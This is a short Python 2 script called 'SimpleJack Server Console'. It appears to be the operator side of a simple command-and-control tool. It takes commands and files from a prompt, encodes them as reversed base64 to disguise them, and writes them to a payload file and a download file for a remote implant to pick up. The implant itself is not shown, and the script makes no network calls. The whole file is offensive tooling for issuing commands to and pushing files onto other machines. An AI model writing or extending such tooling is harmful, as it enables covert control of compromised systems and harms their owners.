import os
import sys
import base64

version = "1.0"
prompt = "\nSimpleJack> "
isExit = False

if len(sys.argv) < 3:
        print "Usage: %s cmdPath downloadPath\nEx: python SimpleJack.py payload.txt download.txt" % sys.argv[0]
        sys.exit(0)

cmdFile = sys.argv[1]
downloadFile = sys.argv[2]

def update_cmd(path, cmd):
        if os.path.exists(path):
                os.remove(path)

        open(path, "w+").write(base64.b64encode(cmd)[::-1])

def update_download(path, localPath):
        if os.path.exists(path):
                os.remove(path)

        if os.path.exists(localPath):
                open(path, "w+").write(base64.b64encode(open(localPath, "r").read())[::-1])
        else:
                print "Cannot update %s not found" % localPath

print "SimpleJack Server Console v%s" % version
print "Supported commands"
print "\tcmd (cmd)\t\tUpdate command"
print "\tfile (localpath)\tUpload file download"
print "\texit\t\t\tExit Console\n"
print "File delivery path set to: %s" % downloadFile
print "Command file path set to: %s" % cmdFile
while(not isExit):
        input = raw_input(prompt)
        cmd = ""
        data = ""
        try:
                cmd, data = input.split(" ", 1)
                cmd = cmd.lower()
        except:
                cmd = input

        if cmd == "exit":
                isExit = True
        elif cmd == "cmd":
                print "Setting command to: %s" % data
                update_cmd(cmdFile, data)
        elif cmd == "file":
                print "File delivery set to %s" % data
                update_download(downloadFile, data)
        else:
                print "Command not found"
